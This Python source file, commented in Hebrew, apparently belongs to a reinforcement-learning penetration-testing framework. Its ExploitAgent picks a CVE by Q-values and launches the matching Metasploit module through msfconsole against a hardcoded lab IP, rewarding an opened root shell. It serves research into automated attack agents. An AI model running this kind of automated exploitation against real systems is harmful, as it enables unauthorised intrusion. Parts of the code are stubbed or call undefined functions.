import random
import tempfile
import subprocess
import sys
import signal
import os
from datetime import datetime
import torch
import numpy as np

from utils.utils import does_not_contain_brackets_or_exploit_warning
from agents.base_agent import BaseAgent
from tools.run_manual import run_clean_output

class ExploitAgent(BaseAgent):
    """
    Agent that attempts to exploit the target using the best known CVE.
    It selects the highest CVSS vulnerability and tests its effect.
    """

    def __init__(self, blackboard_api, replay_buffer, policy_model, state_encoder, action_encoder, command_cache, model, metasploit_dataset, exploitdb_dataset, full_exploit_dataset, epsilon, os_linux_dataset, os_linux_kernel_dataset):
        super().__init__(
            name="ExploitAgent",
            action_space=[],
            blackboard_api=blackboard_api,
            replay_buffer=replay_buffer,
            policy_model=policy_model,
            state_encoder=state_encoder,
            action_encoder=action_encoder,
            command_cache=command_cache,
            model=model,
            epsilon=epsilon,
            os_linux_dataset=os_linux_dataset,
            os_linux_kernel_dataset=os_linux_kernel_dataset
        )
        self.metasploit_dataset = metasploit_dataset
        self.exploitdb_dataset = exploitdb_dataset
        self.full_exploit_dataset = full_exploit_dataset

    def should_run(self):
        return True

    def get_reward(self, prev_flat: dict, action: str, next_flat: dict) -> float:

        prev_failed = {k: v for k, v in prev_flat.items() if k.startswith("failed_cve_idx")}
        next_failed = {k: v for k, v in next_flat.items() if k.startswith("failed_cve_idx")}
        
        new_failed = set(next_failed.values()) - set(prev_failed.values())

        if new_failed:
            print(f"[Reward] New failed CVEs detected: {new_failed}")
            return -2.0  # ניסיון כושל חדש
        
        # אם אין CVE שנכשל עכשיו – נבדוק אם shell נפתח
        before_shell = prev_flat.get("attack_impact.shell_opened", 0.0)
        after_shell = next_flat.get("attack_impact.shell_opened", 0.0)

        if before_shell < 0.5 and after_shell >= 0.5:
            print("[Reward] Shell opened – success!")
            return 10.0

        return -0.5  # ניסיון שלא נכשל אבל גם לא הצליח

    def run(self):
        print("[+] ExploitAgent running...")

        state = self.blackboard_api.get_state_for_agent(self.name)
        vulnerabilities = state.get("vulnerabilities_found", [])

        if not vulnerabilities:
            print("[!] No CVEs found — skipping.")
            return

        failed_cves = state.get("failed_CVEs", [])
        encoded_state = self.state_encoder.encode(state, actions_history=failed_cves)

        # שלב 1: נבנה את רשימת הפעולות האפשריות (מזהי CVE והאינדקסים שלהן)
        candidate_cves = []
        candidate_indices = []

        for vuln in vulnerabilities:
            cve_id = vuln["cve"]
            action_idx = self.action_encoder.encode(cve_id)
            candidate_cves.append(cve_id)
            candidate_indices.append(action_idx)

        if not candidate_indices:
            print("[!] No valid CVEs with encoded actions.")
            return

        # שלב 2: קבלת Q-values לכל action
        state_tensor = encoded_state.clone().detach().float().unsqueeze(0).to(self.device)
        all_q_values = self.policy_model(state_tensor).cpu().detach().numpy().flatten()

        candidate_q_values = [all_q_values[i] for i in candidate_indices]

        # שלב 3: בחירה לפי epsilon-greedy
        if random.random() < self.epsilon:
            selected_idx = random.randint(0, len(candidate_indices) - 1)
            print("[ExploitAgent] Exploring...")
        else:
            selected_idx = int(np.argmax(candidate_q_values))
            print("[ExploitAgent] Exploiting best predicted CVE...")

        selected_cve = candidate_cves[selected_idx]
        selected_action_idx = candidate_indices[selected_idx]

        print(f"[ExploitAgent] Selected CVE: {selected_cve}")

        # שלב 4: הרצת Exploit
        found = self.find_exploit(selected_cve)
        if not found:
            print(f"[✗] No exploit found for {selected_cve}")
            return

        if found.get("metasploit"):
            exploit_info = found["metasploit"]
            success, output = self.run_metasploit_exploit_script(exploit_info)
        elif found.get("exploitdb"):
            exploit_info = found["exploitdb"]
            success, output = self.run_exploitdb_exploit_script(exploit_info)
        else:
            print("[!] No exploit info.")
            return

        # שלב 5: עדכון State ב־blackboard
        if success:
            state["attack_impact"] = {"shell_opened": {"shell_type": "bash", "shell_access_level": "root"}}
        else:
            state["attack_impact"] = {"shell_opened": {}}
            failed = state.get("failed_CVEs", [])
            failed.append(selected_cve)
            state["failed_CVEs"] = failed

        self.blackboard_api.update_state(self.name, state)

        # שלב 6: למידה – חישוב תגמול ועדכון replay buffer
        next_state = self.blackboard_api.get_state_for_agent(self.name)
        encoded_next_state = self.state_encoder.encode(next_state, actions_history=[])

        reward = 1.0 if success else -1.0

        experience = {
            "state": encoded_state,
            "action": selected_action_idx,  # רק index של פעולה
            "reward": reward,
            "next_state": encoded_next_state,
            "done": False
        }
        if self.replay_buffer is not None:
            self.replay_buffer.add_experience(**experience)
        #self.policy_model.update_policy()

        print(f"[ExploitAgent] Finished CVE={selected_cve} | Reward={reward}")


    def get_exploit_path_for_cve(self, cve_id):
        exploit = self.find_exploit(cve_id)
        if exploit is None:
            exploit = check_exploitdb_dataset(cve_id)
        return exploit
    
    def check_metasploit_dataset(self, cve_id):
        """
        מחפש את ה־CVE הרצוי בתוך מאגר Metasploit ומחזיר את הרשומה המלאה אם נמצא.

        Args:
            cve_id (str): מזהה CVE לחיפוש (למשל 'CVE-2018-14665').

        Returns:
            dict | None: רשומת אקפלויט תואמת או None אם לא נמצא.
        """
        for entry in self.metasploit_dataset:
            if entry.get("cve") == cve_id:
                return entry
        return None
    
    def run_metasploit_exploit_script(self, exploit_info):
        exploit_path = exploit_info.get("exploit_path")
        payload = exploit_info.get("default_payload")
        options = exploit_info.get("required_options", {})

        if not exploit_path:
            print("[✗] exploit_path is missing.")
            return False, ""

        print(f"[⚙️] Launching Metasploit exploit: {exploit_path}")

        commands = [f"use {exploit_path}"]
        if payload:
            commands.append(f"set PAYLOAD {payload}")
        commands.append(f"set RHOST 192.168.56.101")  # TODO: הפוך לגנרי לפי state

        for key, val in options.items():
            if val:
                commands.append(f"set {key} {val}")

        commands.append("run -z")
        commands.append("sessions 1 -i")
        commands.append("exit -y")

        full_command = "msfconsole -q -x \"" + "; ".join(commands) + "\""

        try:
            output = run_clean_output(full_command, timeout=60)
            success = does_not_contain_brackets_or_exploit_warning(output)
            if success:
                print("\033[38;5;208mAttack Executed Successfully\033[0m")

            return success, output
        except subprocess.TimeoutExpired:
            print("[!] Timeout expired.")
            return False, ""
        except Exception as e:
            print(f"[!] Error: {e}")
            return False, ""

    
    def run_exploitdb_exploit_script(self, exploit_info):
        return None
    def check_exploitdb_dataset(self, cve_id):
        return None

    def find_exploit(self, cve_id):
        """
        Searches both Metasploit and ExploitDB datasets for a given CVE ID.

        Args:
            cve_id (str): The CVE identifier to search for.

        Returns:
            dict | None: A merged dictionary with keys 'metasploit' and/or 'exploitdb'.
        """
        result = {"cve": cve_id, "metasploit": None, "exploitdb": None}

        # חיפוש במאגר Metasploit
        for entry in self.metasploit_dataset:
            if entry.get("cve") == cve_id:
                result["metasploit"] = entry
                break

        # חיפוש ב־ExploitDB
        """
        for entry in self.exploitdb_dataset:
            if not isinstance(entry, dict):
                continue
            if entry.get("cve") == cve_id:
                result["exploitdb"] = {
                    "exploit_path": entry.get("exploit_path", ""),
                    "cve": cve_id,
                    "source": "exploitdb"
                }
                break
                """
        # אם לא נמצא באף אחד – מחזירים None
        if not result["metasploit"] and not result["exploitdb"]:
            return None

        return result

